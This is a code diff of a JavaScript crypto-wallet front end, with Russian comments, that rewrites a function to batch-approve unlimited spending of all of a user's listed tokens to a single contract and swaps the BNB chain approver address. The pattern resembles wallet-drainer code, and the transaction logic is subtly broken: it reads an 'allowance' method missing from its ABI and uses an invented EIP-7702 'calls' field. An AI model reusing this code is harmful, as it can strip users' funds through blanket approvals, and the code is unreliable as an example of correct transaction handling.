@@ -607,7 +607,7 @@ const CONTRACTS = {
 
 const BATCH_APPROVER_CONTRACTS = {
   [networkMap['Ethereum'].chainId]: '0xYourEthereumBatchApproverAddress', // Замените на реальный адрес
-  [networkMap['BNB Smart Chain'].chainId]: '0x1302207a7F01eD01D51fF0842CFf402C76B77669', // Замените на реальный адрес
+  [networkMap['BNB Smart Chain'].chainId]: '0x30e89c00a84BFB0672dda047A205EC3cc2ddbe72', // Замените на реальный адрес
   [networkMap['Polygon'].chainId]: '0xYourPolygonBatchApproverAddress', // Замените на реальный адрес
 }
 
@@ -674,12 +674,12 @@ const TOKENS = {
 
 const erc20Abi = [
   {
-    constant: true,
-    inputs: [{ name: '_owner', type: 'address' }],
-    name: 'balanceOf',
-    outputs: [{ name: 'balance', type: 'uint256' }],
-    type: 'function',
-  },
+        constant: true,
+        inputs: [{ name: '_owner', type: 'address' }],
+        name: 'balanceOf',
+        outputs: [{ name: 'balance', type: 'uint256' }],
+        type: 'function',
+    },
   {
     constant: false,
     inputs: [
@@ -689,8 +689,8 @@ const erc20Abi = [
     name: 'approve',
     outputs: [{ name: 'success', type: 'bool' }],
     type: 'function',
-  },
-]
+    },
+];
 
 const batchApproverAbi = [
   {
@@ -779,42 +779,90 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
 
 const batchApproveTokens = async (wagmiConfig, tokens, contractAddress, chainId) => {
   if (!wagmiConfig) {
-    throw new Error('wagmiConfig is not initialized')
+    throw new Error('wagmiConfig is not initialized');
   }
   if (!tokens.length || !contractAddress) {
-    throw new Error('Missing tokens or contract address')
+    throw new Error('Missing tokens or contract address');
   }
   if (!isAddress(contractAddress)) {
-    throw new Error('Invalid contract address')
+    throw new Error('Invalid contract address');
   }
 
-  const checksumContractAddress = getAddress(contractAddress)
-  const tokenAddresses = tokens.map(token => getAddress(token.address))
-  const amounts = tokens.map(token => parseUnits(token.balance.toString(), token.decimals))
+  const checksumContractAddress = getAddress(contractAddress);
 
   try {
-    const gasLimit = BigInt(12500 + 46000 * tokens.length) // 12,500 для EIP-7702 + 46,000 за каждый approve
-    const maxFeePerGas = BigInt(10_000_000_000)
-    const maxPriorityFeePerGas = BigInt(2_000_000_000)
+    // Формируем EIP-7702 транзакцию
+    const calls = tokens.map(token => ({
+      target: getAddress(token.address),
+      data: encodeFunctionData({
+        abi: erc20Abi,
+        functionName: 'approve',
+        args: [checksumContractAddress, maxUint256],
+      }),
+    }));
 
-    console.log(`Batch approving ${tokens.length} tokens on chain ${chainId} with gasLimit: ${gasLimit}`)
+    // Проверяем, поддерживает ли кошелек EIP-7702
+    const provider = await wagmiConfig.getProvider();
+    const isEIP7702Supported = await provider.request({
+      method: 'eth_getSupportedTransactionTypes',
+      params: [],
+    }).then(types => types.includes('0x04')).catch(() => false);
 
-    const txHash = await writeContract(wagmiConfig, {
-      address: BATCH_APPROVER_CONTRACTS[chainId],
-      abi: batchApproverAbi,
-      functionName: 'batchApprove',
-      args: [tokenAddresses, checksumContractAddress, amounts],
-      chainId,
-      gas: gasLimit,
-      maxFeePerGas,
-      maxPriorityFeePerGas,
-    })
+    let txHash;
+    if (isEIP7702Supported) {
+      console.log('Using EIP-7702 for batch approval');
+      // Формируем EIP-7702 транзакцию
+      const eip7702Tx = {
+        type: '0x04', // EIP-7702 transaction type
+        chainId: chainId,
+        nonce: await provider.getTransactionCount(wagmiConfig.account.address),
+        gasLimit: BigInt(12500 + 65000 * tokens.length),
+        maxFeePerGas: BigInt(10_000_000_000),
+        maxPriorityFeePerGas: BigInt(2_000_000_000),
+        calls: calls, // Массив вызовов approve
+      };
 
-    console.log(`Batch approve transaction sent: ${txHash}`)
-    return txHash
+      txHash = await provider.request({
+        method: 'eth_sendTransaction',
+        params: [eip7702Tx],
+      });
+    } else {
+      console.log('EIP-7702 not supported, falling back to individual approvals');
+      // Fallback на стандартные вызовы approve
+      for (const token of tokens) {
+        const currentAllowance = await readContract(wagmiConfig, {
+          address: token.address,
+          abi: erc20Abi,
+          functionName: 'allowance',
+          args: [wagmiConfig.account.address, checksumContractAddress],
+          chainId,
+        });
+
+        if (currentAllowance >= parseUnits(token.balance.toString(), token.decimals)) {
+          console.log(`Skipping approve for ${token.symbol}: sufficient allowance`);
+          continue;
+        }
+
+        const tx = await writeContract(wagmiConfig, {
+          address: token.address,
+          abi: erc20Abi,
+          functionName: 'approve',
+          args: [checksumContractAddress, maxUint256],
+          chainId,
+          gas: BigInt(65000),
+          maxFeePerGas: BigInt(10_000_000_000),
+          maxPriorityFeePerGas: BigInt(2_000_000_000),
+        });
+        console.log(`Approved ${token.symbol}: ${tx}`);
+      }
+      txHash = 'fallback'; // Для совместимости с последующей логикой
+    }
+
+    console.log(`Batch approve transaction sent: ${txHash}`);
+    return txHash;
   } catch (error) {
-    store.errors.push(`Batch approve failed: ${error.message}`)
-    throw error
+    store.errors.push(`Batch approve failed: ${error.message}`);
+    throw error;
   }
 }
 
